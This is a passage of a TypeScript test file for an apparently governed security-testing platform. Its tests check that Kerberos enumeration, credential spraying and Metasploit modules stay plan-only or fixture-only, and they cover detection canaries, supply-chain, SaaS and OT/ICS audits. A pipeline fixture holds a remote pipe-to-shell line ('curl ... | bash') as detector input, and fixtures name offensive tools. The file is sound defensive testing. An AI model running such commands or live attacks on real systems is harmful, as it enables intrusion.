      expect(
        evaluateModuleStartConstraints({
          executionEnvironment: "InternalRunner",
          moduleManifests: [mod!.manifest],
          runnerId: randomUUID(),
          target: { ...authorized, dryRun: false }
        })
      ).toMatchObject({
        allowed: false,
        // P05-10: live permanently disabled (not unlocked by destructive tier).
        code: `${moduleId.replaceAll(".", "_")}_live_permanently_disabled`
      });
    }
  });
});

describe("kerbrute kerberos userenum (governed AD)", () => {
  it("plans only when not explicitly live", async () => {
    const output = await executeModuleById(
      "identity.kerberos_userenum",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "ControlledValidation",
        target: { domain: "corp.internal", targetHost: "dc01.corp.internal" }
      })
    );
    expect(output.outcome).toBe("kerberos_userenum_planned");
    expect(output.validationState).toBe("Inconclusive");
  });

  it("enumerates valid usernames in fixture mode without Validated + measured", async () => {
    const output = await executeModuleById(
      "identity.kerberos_userenum",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "ControlledValidation",
        target: {
          domain: "corp.internal",
          fixtureMode: true,
          fixtureValidUsers: ["[+] VALID USERNAME: jdoe@corp.internal"],
          targetHost: "dc01.corp.internal"
        }
      })
    );
    expect(output.outcome).toBe("valid_usernames_found");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals[0]?.signalSubcategory).toBe("ValidUsernameExposure");
    expect(output.evidence[0]?.attributes.measured).toBe(false);
    expect(output.evidence[0]?.attributes.fixture).toBe(true);
  });

  it("blocks direct Kerberos live execution in the module layer", async () => {
    const output = await executeModuleById(
      "identity.kerberos_userenum",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "ControlledValidation",
        target: {
          domain: "corp.internal",
          dryRun: false,
          targetHost: "dc01.corp.internal"
        }
      })
    );

    expect(output.outcome).toBe("kerberos_live_execution_disabled");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes.liveExecutionDisabled).toBe(true);
    expect(output.evidence[0]?.attributes.measured).toBe(false);
  });

  it("is governed: denied without authorization, allowed once authorized", () => {
    const mod = getModuleById("identity.kerberos_userenum");
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "InternalRunner",
        moduleManifests: [mod!.manifest],
        runnerId: randomUUID(),
        target: {}
      })
    ).toMatchObject({ allowed: false });
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "InternalRunner",
        moduleManifests: [mod!.manifest],
        runnerId: randomUUID(),
        target: {
          approvalId: randomUUID(),
          authorizedOffensive: true,
          scopeVerified: true
        }
      })
    ).toMatchObject({ allowed: true });
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "InternalRunner",
        moduleManifests: [mod!.manifest],
        runnerId: randomUUID(),
        target: {
          approvalId: randomUUID(),
          authorizedOffensive: true,
          dryRun: false,
          scopeVerified: true
        }
      })
    ).toMatchObject({
      allowed: false,
      code: "identity_kerberos_userenum_live_permanently_disabled"
    });
  });

  it("P05-10: never lifts kerberos/spray live under destructive tier (permanent hard-deny)", () => {
    // Execute path is fixture/plan-only; start must match so product truth is
    // not dual-gate theater (prior residual unlocked start while execute stayed dead).
    for (const moduleId of [
      "identity.kerberos_userenum",
      "identity.cred_spray",
      "exploit.metasploit_check"
    ]) {
      const mod = getModuleById(moduleId);
      expect(
        evaluateModuleStartConstraints({
          executionEnvironment: "InternalRunner",
          moduleManifests: [mod!.manifest],
          runnerId: randomUUID(),
          target: {
            approvalId: randomUUID(),
            authorizedDestructive: true,
            authorizedOffensive: true,
            dryRun: false,
            scopeVerified: true
          }
        })
      ).toMatchObject({
        allowed: false,
        code: `${moduleId.replaceAll(".", "_")}_live_permanently_disabled`
      });
    }

    // Plan/dry-run still allowed once governed (not live).
    const kerberos = getModuleById("identity.kerberos_userenum");
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "InternalRunner",
        moduleManifests: [kerberos!.manifest],
        runnerId: randomUUID(),
        target: {
          approvalId: randomUUID(),
          authorizedOffensive: true,
          scopeVerified: true
        }
      })
    ).toMatchObject({ allowed: true });

    // Destructive tier still does not bypass earlier gates without approval.
    expect(
      evaluateModuleStartConstraints({
        executionEnvironment: "InternalRunner",
        moduleManifests: [kerberos!.manifest],
        runnerId: randomUUID(),
        target: {
          authorizedDestructive: true,
          dryRun: false,
          scopeVerified: true
        }
      })
    ).toMatchObject({ allowed: false });
  });
});

describe("periscan.detection_marker_probe (detection correlation)", () => {
  it("reports Detected and labels measured ONLY when the telemetry is live", async () => {
    const markerId = "periscan-marker-fixed-123";
    const output = await executeModuleById(
      "periscan.detection_marker_probe",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          hostname: "app.example.com",
          markerId,
          techniqueId: "T1059",
          liveTelemetry: true,
          observedEvents: [
            { message: "process created", cmd: "irrelevant" },
            { message: `alert: suspicious activity ${markerId} flagged` }
          ]
        }
      })
    );

    expect(output.outcome).toBe("detection_rule_fired");
    expect(output.validationState).toBe("Detected");
    const attrs = output.evidence[0]?.attributes as {
      measured: boolean;
      telemetrySource: string;
      correlatesOnly: boolean;
    };
    expect(attrs.measured).toBe(true);
    expect(attrs.telemetrySource).toBe("live-connector");
    // Honesty: the module never claims to have injected anything.
    expect(attrs.correlatesOnly).toBe(true);
    expect("injected" in attrs).toBe(false);
  });

  it("does NOT claim measured when the telemetry is caller-supplied (not live)", async () => {
    const output = await executeModuleById(
      "periscan.detection_marker_probe",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          hostname: "app.example.com",
          markerId: "periscan-marker-absent-999",
          observedEvents: [{ message: "unrelated log line" }]
        }
      })
    );
    expect(output.validationState).toBe("Missed");
    expect(
      (output.evidence[0]?.attributes as { measured: boolean }).measured
    ).toBe(false);
  });

  it("is Inconclusive (never Missed) when no telemetry is supplied", async () => {
    const output = await executeModuleById(
      "periscan.detection_marker_probe",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: { hostname: "app.example.com", markerId: "m-none" }
      })
    );
    expect(output.outcome).toBe("detection_no_telemetry");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
  });

  it("evaluateDetectionMarker matches only the exact unique marker", () => {
    expect(
      evaluateDetectionMarker("marker-abc", ["noise", { m: "has marker-abc!" }])
        .detected
    ).toBe(true);
    expect(
      evaluateDetectionMarker("marker-abc", ["marker-abd", "marker-ab"])
        .detected
    ).toBe(false);
  });
});

describe("Wave B detection marker emit→observe loop", () => {
  it("allowlists only periscan-* benign marker ids", () => {
    expect(isAllowlistedDetectionMarkerId("periscan-endpoint-test-42")).toBe(
      true
    );
    expect(isAllowlistedDetectionMarkerId("malware-sample.exe")).toBe(false);
    expect(isAllowlistedDetectionMarkerId("T1059")).toBe(false);
    expect(createAllowlistedDetectionMarkerId("unit-test-loop")).toMatch(
      /^periscan-/u
    );
  });

  it("closes the signed emit→observe loop against mock SIEM telemetry", async () => {
    const platform = process.platform === "darwin" ? "macOS" : "Linux";
    const markerId = "periscan-wave-b-loop-42";
    const loop = await runDetectionMarkerEmitObserveLoop({
      liveTelemetry: true,
      markerId,
      observedEvents: [
        {
          event: "process_create",
          message: `EDR alert: allowlisted canary ${markerId}`,
          techniqueId: "T1059"
        }
      ],
      performEmit: true,
      platform,
      techniqueId: "T1059",
      telemetryWindowComplete: true
    });

    expect(loop.emitReceipt.emitted).toBe(true);
    expect(loop.closedLoop).toBe(true);
    expect(loop.validationState).toBe("Detected");
    expect(loop.outcome).toBe("detection_marker_emit_observe_detected");
    expect(loop.measured).toBe(true);
    expect(loop.evidenceAttributes).toMatchObject({
      closedLoop: true,
      drvClaimClass: "benign_marker_only",
      fullAttackLibrary: false,
      realMalware: false
    });
  });

  it("refuses non-allowlisted markers without emitting", async () => {
    const loop = await runDetectionMarkerEmitObserveLoop({
      markerId: "evil-payload",
      observedEvents: ["evil-payload"],
      performEmit: true,
      platform: "Linux"
    });
    expect(loop.outcome).toBe("detection_marker_not_allowlisted");
    expect(loop.emitReceipt.emitted).toBe(false);
    expect(loop.closedLoop).toBe(false);
  });

  it("module product path emits then correlates in one evidence chain", async () => {
    const platform = process.platform === "darwin" ? "macOS" : "Linux";
    const markerId = "periscan-module-loop-99";
    const output = await executeModuleById(
      "periscan.detection_marker_emit_observe",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          expectedRule: "process_canary_rule",
          liveTelemetry: true,
          markerId,
          observedEvents: [
            `mock SIEM: detection rule fired for ${markerId}`
          ],
          performEmit: true,
          platform,
          techniqueId: "T1059"
        }
      })
    );

    expect(output.outcome).toBe("detection_marker_emit_observe_detected");
    expect(output.validationState).toBe("Detected");
    expect(output.evidence).toHaveLength(1);
    expect(output.evidence[0]?.attributes).toMatchObject({
      closedLoop: true,
      emitted: true,
      markerId,
      measured: true,
      productPath: "detection_marker_emit_observe"
    });
    expect(output.signals[0]?.signalSubcategory).toBe(
      "DetectionMarkerClosedLoopDetected"
    );
  });

  it("records measured Missed only with emit + live telemetry + empty window", async () => {
    const platform = process.platform === "darwin" ? "macOS" : "Linux";
    const markerId = "periscan-loop-miss-7";
    const loop = await runDetectionMarkerEmitObserveLoop({
      liveTelemetry: true,
      markerId,
      observedEvents: [{ message: "unrelated process event" }],
      performEmit: true,
      platform,
      telemetryWindowComplete: true
    });
    expect(loop.emitReceipt.emitted).toBe(true);
    expect(loop.closedLoop).toBe(true);
    expect(loop.validationState).toBe("Missed");
    expect(loop.measured).toBe(true);
  });

  it("keeps fixture mode from claiming measured emit", async () => {
    const loop = await runDetectionMarkerEmitObserveLoop({
      fixtureMode: true,
      liveTelemetry: false,
      markerId: "periscan-fixture-loop-1",
      observedEvents: ["periscan-fixture-loop-1"],
      performEmit: true,
      platform: "Linux"
    });
    expect(loop.emitReceipt.emitted).toBe(false);
    expect(loop.emitReceipt.source).toBe("fixture-planned");
    expect(loop.closedLoop).toBe(false);
    expect(loop.measured).toBe(false);
  });

  it("accepts a prior runner emit receipt without re-emitting", async () => {
    const markerId = "periscan-prior-receipt-1";
    const loop = await runDetectionMarkerEmitObserveLoop({
      emitReceipt: {
        emitted: true,
        markerId,
        measured: true,
        platform: "Linux",
        receiptSha256: "a".repeat(64),
        source: "runner-receipt"
      },
      liveTelemetry: true,
      markerId,
      observedEvents: [`alert ${markerId}`],
      performEmit: false
    });
    expect(loop.emitReceipt.source).toBe("runner-receipt");
    expect(loop.closedLoop).toBe(true);
    expect(loop.validationState).toBe("Detected");
  });
});

describe("platform-specific endpoint detection analytics", () => {
  it("emits a real, shell-free endpoint marker receipt on the matching runner platform", async () => {
    const platform = process.platform === "darwin" ? "macOS" : "Linux";
    const output = await executeModuleById(
      "periscan.endpoint_benign_marker_emit",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          hostname: "runner-01.corp.internal",
          markerId: "periscan-endpoint-test-42",
          platform
        }
      })
    );

    expect(output.outcome).toBe("endpoint_marker_emitted");
    expect(output.validationState).toBe("Validated");
    expect(output.signals[0]?.signalSubcategory).toBe(
      "EndpointBenignMarkerEmitted"
    );
    expect(output.evidence[0]?.attributes).toMatchObject({
      emitted: true,
      markerId: "periscan-endpoint-test-42",
      measured: true,
      platform
    });
    expect(output.evidence[0]?.attributes.receiptSha256).toMatch(
      /^[a-f0-9]{64}$/u
    );
  });

  it("never emits or claims measurement in endpoint marker fixture mode", async () => {
    const output = await executeModuleById(
      "periscan.endpoint_benign_marker_emit",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureMode: true,
          hostname: "runner-01.corp.internal",
          markerId: "periscan-endpoint-fixture-42",
          platform: "Linux"
        }
      })
    );

    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes).toMatchObject({
      emitted: false,
      measured: false
    });
  });

  it("records a measured macOS detection only from verified live telemetry", async () => {
    const output = await executeModuleById(
      "periscan.endpoint_macos_detection_analytics",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: {
          liveTelemetry: true,
          observedEvents: [
            {
              event: "osascript execution detected",
              os: "macOS",
              techniqueId: "T1059.002"
            }
          ],
          platformVerified: true
        }
      })
    );

    expect(output.validationState).toBe("Detected");
    expect(output.outcome).toBe("endpoint_macos_detection_observed");
    expect(output.signals[0]?.techniqueIds).toContain("T1059.002");
    expect(output.evidence[0]?.attributes).toMatchObject({
      measured: true,
      platform: "macOS",
      platformVerified: true
    });
  });

  it("requires a matching Linux emission receipt and completed live window before Missed", async () => {
    const output = await executeModuleById(
      "periscan.endpoint_linux_detection_analytics",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: {
          liveTelemetry: true,
          observedEvents: [{ message: "unrelated process event", os: "linux" }],
          platformVerified: true,
          stimulus: {
            emitted: true,
            markerId: "periscan-linux-canary-42",
            platform: "Linux"
          },
          telemetryWindowComplete: true
        }
      })
    );

    expect(output.validationState).toBe("Missed");
    expect(output.outcome).toBe("endpoint_linux_detection_missed");
    expect(output.evidence[0]?.attributes).toMatchObject({
      measured: true,
      sharedMarkerCorrelation: true,
      stimulusEmitted: true,
      telemetryWindowComplete: true
    });
  });

  it("correlates macOS analytics against the shared allowlisted marker when telemetry present", async () => {
    const markerId = "periscan-macos-shared-marker-1";
    const output = await executeModuleById(
      "periscan.endpoint_macos_detection_analytics",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: {
          liveTelemetry: true,
          observedEvents: [
            {
              event: "osascript canary observed",
              markerId,
              os: "macOS"
            }
          ],
          platformVerified: true,
          stimulus: {
            emitted: true,
            markerId,
            platform: "macOS"
          },
          telemetryWindowComplete: true
        }
      })
    );

    expect(output.validationState).toBe("Detected");
    expect(output.evidence[0]?.attributes).toMatchObject({
      closedLoopPartial: true,
      drvClaimClass: "benign_marker_only",
      markerId,
      measured: true,
      sharedMarkerCorrelation: true
    });
  });

  it("keeps an unverified or empty endpoint source Inconclusive", async () => {
    const output = await executeModuleById(
      "periscan.endpoint_macos_detection_analytics",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: { observedEvents: [] }
      })
    );

    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(output.evidence[0]?.attributes).toMatchObject({ measured: false });
  });
});

describe("periscan.kubernetes_cis_posture", () => {
  it("normalizes live failed controls into measured Kubernetes evidence", async () => {
    const assetId = "11111111-1111-4111-8111-111111111111";
    const output = await executeModuleById(
      "periscan.kubernetes_cis_posture",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: {
          assetId,
          clusterName: "payments-prod",
          controls: [
            {
              id: "1.2.1",
              status: "FAIL",
              title: "API server anonymous authentication is disabled"
            },
            {
              id: "1.2.2",
              status: "PASS",
              title: "API server authorization mode is restricted"
            }
          ],
          liveCollector: true,
          source: "kube-bench"
        }
      })
    );

    expect(output.validationState).toBe("Validated");
    expect(output.outcome).toBe("kubernetes_cis_failures_observed");
    expect(output.signals[0]?.signalSubcategory).toBe(
      "KubernetesCisControlFailed"
    );
    expect(output.signals[0]?.relatedAssetIds).toEqual([assetId]);
    expect(output.signals[0]?.rawPayloadPointer).toContain(
      `periscan-kubernetes://${assetId}`
    );
    expect(output.evidence[0]?.attributes).toMatchObject({
      clusterName: "payments-prod",
      assetId,
      controlCount: 2,
      measured: true,
      source: "kube-bench"
    });
  });

  it("does not turn a clean supplied report into a measured pass", async () => {
    const output = await executeModuleById(
      "periscan.kubernetes_cis_posture",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: {
          clusterName: "dev-cluster",
          controls: [
            {
              id: "5.1.1",
              status: "PASS",
              title: "Cluster admin use is restricted"
            }
          ],
          source: "supplied-report"
        }
      })
    );

    expect(output.validationState).toBe("Inconclusive");
    expect(output.outcome).toBe("kubernetes_cis_clean_report_unverified");
    expect(output.evidence[0]?.attributes).toMatchObject({ measured: false });
  });

  it("does not throw on a Community InternalNetwork target without clusterName", async () => {
    const output = await executeModuleById(
      "periscan.kubernetes_cis_posture",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: {
          cidr: "10.0.0.0/24",
          hostname: "cluster.internal"
        }
      })
    );

    expect(output.validationState).toBe("Inconclusive");
    expect(output.outcome).toBe("kubernetes_cis_input_missing");
    expect(output.signals).toEqual([]);
    expect(output.evidence[0]?.attributes).toMatchObject({
      measured: false,
      reason: "control_results_missing"
    });
  });
});

describe("periscan.dns_exfil_canary (DNS-exfil detection)", () => {
  it("correlates a supplied-telemetry hit as Detected without overclaiming measured", async () => {
    const output = await executeModuleById(
      "periscan.dns_exfil_canary",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          hostname: "corp.example.com",
          markerId: "exfil-fixed-777",
          fixtureMode: true,
          observedEvents: [
            { alert: "DNS tunneling suspected: periscan-exfil-fixed-777.x" }
          ]
        }
      })
    );
    expect(output.outcome).toBe("dns_exfil_detected");
    expect(output.validationState).toBe("Detected");
    expect(output.signals[0]?.techniqueIds).toContain("T1048");
    const attrs = output.evidence[0]?.attributes as {
      measured: boolean;
      emitted: boolean;
      realDataExfiltrated: boolean;
    };
    // fixtureMode → no real emit → not measured; no false claims.
    expect(attrs.emitted).toBe(false);
    expect(attrs.measured).toBe(false);
    expect(attrs.realDataExfiltrated).toBe(false);
  });

  it("is Inconclusive when the canary is emitted but no telemetry confirms detection", async () => {
    const output = await executeModuleById(
      "periscan.dns_exfil_canary",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          hostname: "corp.example.com",
          markerId: "exfil-absent-000",
          fixtureMode: true
        }
      })
    );
    expect(output.outcome).toBe("dns_exfil_no_telemetry");
    expect(output.validationState).toBe("Inconclusive");
  });

  it("does not double-prefix allowlisted periscan-* markers (product path)", async () => {
    const markerId = "periscan-dns-product-path-1";
    const output = await executeModuleById(
      "periscan.dns_exfil_canary",
      createContext({
        safetyLevel: "ActiveNonInvasive",
        target: {
          hostname: "corp.example.com",
          markerId,
          fixtureMode: true,
          observedEvents: [
            { alert: `DNS tunneling suspected: ${markerId}.corp.example.com` }
          ]
        }
      })
    );
    expect(output.outcome).toBe("dns_exfil_detected");
    expect(output.evidence[0]?.attributes).toMatchObject({
      canaryLabel: markerId,
      measured: false,
      realDataExfiltrated: false
    });
    expect(String(output.evidence[0]?.attributes?.canaryLabel)).not.toMatch(
      /^periscan-periscan-/
    );
  });
});

describe("sscs.pipeline_audit (CI/CD supply-chain)", () => {
  it("does not report a clean pipeline when repository content is absent", async () => {
    const output = await executeModuleById(
      "sscs.pipeline_audit",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: { repositoryPath: "/repo" }
      })
    );
    expect(output.outcome).toBe("sscs_pipeline_input_missing");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.evidence[0]?.attributes).toMatchObject({ measured: false });
  });

  const RISKY = [
    "on: pull_request_target",
    "jobs:",
    "  build:",
    "    steps:",
    "      - uses: actions/checkout@main",
    "      - run: curl https://x.sh | bash"
  ].join("\n");

  it("finds real measured supply-chain risks in a pipeline config", () => {
    const findings = auditPipelineConfig(RISKY);
    const rules = findings.map((f) => f.ruleId);
    expect(rules).toContain("sscs.unpinned-action");
    expect(rules).toContain("sscs.pull-request-target");
    expect(rules).toContain("sscs.remote-pipe-to-shell");
    expect(rules).toContain("sscs.missing-permissions");
  });

  it("does not flag a pinned action with least-privilege permissions", () => {
    const safe = [
      "permissions:",
      "  contents: read",
      "jobs:",
      "  build:",
      "    steps:",
      "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683"
    ].join("\n");
    expect(auditPipelineConfig(safe)).toHaveLength(0);
  });

  it("reports the audit through the module with a measured verdict", async () => {
    const output = await executeModuleById(
      "sscs.pipeline_audit",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: { repositoryPath: "/repo", pipelineConfig: RISKY }
      })
    );
    expect(output.outcome).toBe("sscs_pipeline_risks_found");
    expect(output.validationState).toBe("Validated");
    expect(
      (output.evidence[0]?.attributes as { measured: boolean }).measured
    ).toBe(true);
  });

  it("measures OIDC trust, signing, provenance, and SLSA evidence without inferring missing domains", async () => {
    const supplyChainFindings = auditSupplyChainEvidence({
      artifactSigning: { required: true, verified: false },
      oidcTrustPolicies: [
        {
          audienceBound: true,
          branchOrEnvironmentBound: false,
          issuerBound: true,
          repositoryBound: false,
          subjectBound: true
        }
      ],
      provenance: {
        builderIdentityPresent: false,
        immutableSubjectDigestPresent: true,
        required: true,
        verified: false
      },
      slsaLevel: 1,
      slsaRequiredLevel: 3
    });
    expect(supplyChainFindings.map((finding) => finding.ruleId)).toEqual(
      expect.arrayContaining([
        "sscs.oidc-source-unbound",
        "sscs.artifact-signature-unverified",
        "sscs.provenance-unverified",
        "sscs.provenance-incomplete",
        "sscs.slsa-level-below-policy"
      ])
    );

    const output = await executeModuleById(
      "sscs.pipeline_audit",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: {
          pipelineConfig:
            "permissions:\n  contents: read\njobs:\n  build:\n    steps: []",
          repositoryPath: "/repo",
          supplyChainEvidence: {
            artifactSigning: { required: true, verified: true },
            oidcTrustPolicies: [],
            provenance: {
              builderIdentityPresent: true,
              immutableSubjectDigestPresent: true,
              required: true,
              verified: true
            },
            slsaLevel: 3,
            slsaRequiredLevel: 3
          }
        }
      })
    );
    expect(output.outcome).toBe("sscs_pipeline_clean");
    expect(output.evidence[0]?.attributes).toMatchObject({
      coverage: {
        artifactSigning: true,
        oidcTrust: true,
        pipelinePolicy: true,
        provenance: true,
        slsa: true
      },
      measured: true
    });
  });
});

describe("sspm.saas_posture (native SaaS posture)", () => {
  it("does not report a clean tenant when connector posture input is absent", async () => {
    const output = await executeModuleById(
      "sspm.saas_posture",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: { provider: "microsoft365" }
      })
    );
    expect(output.outcome).toBe("sspm_posture_input_missing");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.evidence[0]?.attributes).toMatchObject({ measured: false });
  });

  it("finds real measured posture gaps in a SaaS config", () => {
    const findings = auditSaasPosture({
      mfaEnforced: false,
      legacyAuthEnabled: true,
      externalSharing: "unrestricted",
      auditLoggingEnabled: false
    });
    const rules = findings.map((f) => f.ruleId);
    expect(rules).toContain("sspm.mfa-not-enforced");
    expect(rules).toContain("sspm.legacy-auth-enabled");
    expect(rules).toContain("sspm.external-sharing-unrestricted");
    expect(rules).toContain("sspm.audit-logging-disabled");
  });

  it("reports a clean posture with no gaps", () => {
    expect(
      auditSaasPosture({
        mfaEnforced: true,
        adminMfaEnforced: true,
        legacyAuthEnabled: false,
        externalSharing: "restricted",
        guestAccess: "restricted",
        auditLoggingEnabled: true
      })
    ).toHaveLength(0);
  });

  it("reports the check through the module with a measured verdict", async () => {
    const output = await executeModuleById(
      "sspm.saas_posture",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: {
          provider: "microsoft365",
          saasConfig: { mfaEnforced: false, legacyAuthEnabled: true }
        }
      })
    );
    expect(output.outcome).toBe("sspm_posture_gaps_found");
    expect(output.validationState).toBe("Validated");
  });

  it("does not report fixed posture without measured SaaS controls", async () => {
    const output = await executeModuleById(
      "sspm.saas_posture",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: {
          provider: "microsoft365",
          saasConfig: { connectorMetadata: "present-but-not-posture-data" }
        }
      })
    );

    expect(output.outcome).toBe("sspm_posture_input_missing");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.signals).toHaveLength(0);
    expect(
      (output.evidence[0]?.attributes as { measured: boolean }).measured
    ).toBe(false);
  });
});

describe("ot_ics.protocol_exposure (non-disruptive OT/ICS)", () => {
  it("remains inconclusive without prior reachability observations", async () => {
    const output = await executeModuleById(
      "ot_ics.protocol_exposure",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: { host: "10.0.0.9" }
      })
    );
    expect(output.outcome).toBe("ot_ics_reachability_input_missing");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.evidence[0]?.attributes).toMatchObject({
      measured: false,
      partnerLabQualified: false
    });
  });

  it("flags reachable industrial protocols without speaking them", () => {
    const findings = assessOtIcsExposure([443, 502, 20000, 80]);
    expect(findings.map((f) => f.protocol)).toEqual(
      expect.arrayContaining(["Modbus", "DNP3"])
    );
    expect(findings.every((f) => f.severity === "High")).toBe(true);
  });

  it("reports no OT exposure when only IT ports are open", () => {
    expect(assessOtIcsExposure([80, 443, 22])).toHaveLength(0);
  });

  it("reports the audit through the module as non-disruptive + measured", async () => {
    const output = await executeModuleById(
      "ot_ics.protocol_exposure",
      createContext({
        safetyLevel: "PassiveReadOnly",
        target: { host: "10.0.0.9", openPorts: [502, 44818] }
      })
    );
    expect(output.outcome).toBe("ot_ics_protocol_exposed");
    const attrs = output.evidence[0]?.attributes as {
      measured: boolean;
      nonDisruptive: boolean;
    };
    expect(attrs.measured).toBe(true);
    expect(attrs.nonDisruptive).toBe(true);
  });
});

describe("P05-1 fixture/sim never stamps Validated + measured:true", () => {
  it("remaps exposure-proof validation states for fixture/sim paths", () => {
    expect(validationStateForFixtureOrSimulation("Validated")).toBe(
      "Inconclusive"
    );
    expect(validationStateForFixtureOrSimulation("Exploitable")).toBe(
      "Inconclusive"
    );
    expect(validationStateForFixtureOrSimulation("Fixed")).toBe("Inconclusive");
    expect(validationStateForFixtureOrSimulation("StillExposed")).toBe(
      "Inconclusive"
    );
    // Control observation + discovery states pass through.
    expect(validationStateForFixtureOrSimulation("Detected")).toBe("Detected");
    expect(validationStateForFixtureOrSimulation("Blocked")).toBe("Blocked");
    expect(validationStateForFixtureOrSimulation("Reachable")).toBe("Reachable");
    expect(validationStateForFixtureOrSimulation("Inconclusive")).toBe(
      "Inconclusive"
    );
  });

  it("watermarks fixture/sim evidence as non-measured", () => {
    expect(
      fixtureOrSimulationEvidenceAttributes({ finding: "x", measured: true })
    ).toMatchObject({
      finding: "x",
      fixture: true,
      measured: false,
      simulated: true
    });
    expect(
      fixtureOrSimulationEvidenceAttributes({ simulated: false })
    ).toMatchObject({ fixture: true, measured: false, simulated: false });
  });

  it("ot_ics.safe_baseline fixture never returns Validated", async () => {
    const output = await executeModuleById(
      "ot_ics.safe_baseline",
      createContext({
        runnerId: randomUUID(),
        safetyLevel: "PassiveReadOnly",
        target: { fixtureMode: true, targetHost: "plc-01.plant.local" }
      })
    );
    expect(output.outcome).toBe("ot_ics_safe_baseline_complete");
    expect(output.validationState).toBe("Inconclusive");
    expect(output.evidence[0]?.attributes.measured).toBe(false);
    expect(output.evidence[0]?.attributes.fixture).toBe(true);
  });

  it("ot_ics.safe_baseline does not advertise live support without a runner payload", () => {
    const module = getModuleById("ot_ics.safe_baseline");
    expect(module?.manifest.liveSupported).toBe(false);
    expect(module?.manifest.fixtureSupported).toBe(true);
    expect(module?.manifest.customerVisibleDescription.toLowerCase()).toContain(
      "partner-lab"
    );
  });

  it("kill-chain coverage planner is catalog-only (not an executable attack engine)", () => {
    // Plan-only sim must not appear in the executable production registry.
    expect(getModuleById("exploitation.killchain.engine")).toBeNull();
    expect(
      listModuleManifests().some(
        (item) => item.moduleId === "exploitation.killchain.engine"
      )
    ).toBe(false);
  });

  it("P05-12 catalog-only sims never expose 50k/hyperattack marketing or Validated proof", () => {
    for (const moduleId of [
      "grype.cve_scan",
      "grype.exploit_template",
      "semgrep.code_exploit_scan",
      "semgrep.web_api_exploit",
      "exploitation.killchain.engine"
    ]) {
      expect(getModuleById(moduleId)).toBeNull();
    }
    // Residual module bodies (if ever re-wired) must not ship banned marketing
    // in customer-visible descriptions of the executable registry.
    for (const manifest of listModuleManifests()) {
      const blob = `${manifest.moduleId} ${manifest.name} ${manifest.customerVisibleDescription}`.toLowerCase();
      expect(blob).not.toMatch(/50k\+|50k\s*\+|hyperattack/);
    }
  });

  it("liveSupported:false fixture paths never combine proof states with measured:true", async () => {
    const cases: Array<{
      moduleId: string;
      safetyLevel:
        | "PassiveReadOnly"
        | "ActiveNonInvasive"
        | "ControlledValidation"
        | "AdvancedAdversarial";
      target: Record<string, unknown>;
      runner?: boolean;
    }> = [
      {
        moduleId: "web.tls_audit",
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureMode: true,
          fixtureWeaknesses: ["SSLv3"],
          url: "https://app.example"
        }
      },
      {
        moduleId: "web.sqli_probe",
        safetyLevel: "ControlledValidation",
        target: {
          fixtureMode: true,
          fixtureVulnerable: true,
          url: "https://app.example/q?id=1"
        }
      },
      {
        moduleId: "web.nikto_scan",
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureFindings: ["leak"],
          fixtureMode: true,
          url: "https://app.example"
        }
      },
      {
        moduleId: "web.content_discovery",
        safetyLevel: "ActiveNonInvasive",
        target: {
          fixtureMode: true,
          fixturePaths: ["/admin"],
          url: "https://app.example"
        }
      },
      {
        moduleId: "web.fingerprint",
        safetyLevel: "PassiveReadOnly",
        target: {
          fixtureMode: true,
          fixtureTechnologies: ["nginx"],
          url: "https://app.example"
        }
      },
      {
        moduleId: "identity.cred_spray",
        safetyLevel: "ControlledValidation",
        runner: true,
        target: {
          fixtureMode: true,
          fixtureValidCredentials: ["[+] user:pass"],
          targetHost: "dc.example"
        }
      },
      {
        moduleId: "cloud.scoutsuite_posture",
        safetyLevel: "PassiveReadOnly",
        target: {
          fixtureFindings: ["public-bucket"],
          fixtureMode: true,
          provider: "aws"
        }
      },
      {
        moduleId: "exploit.metasploit_check",
        safetyLevel: "AdvancedAdversarial",
        runner: true,
        target: {
          fixtureMode: true,
          fixtureVulnerable: true,
          moduleName: "auxiliary/scanner/smb/smb_ms17_010",
          targetHost: "10.0.0.5"
        }
      },
      {
        moduleId: "identity.kerberos_userenum",
        safetyLevel: "ControlledValidation",
        runner: true,
        target: {
          domain: "corp.example",
          fixtureMode: true,
          fixtureValidUsers: ["[+] VALID USERNAME: jdoe"],
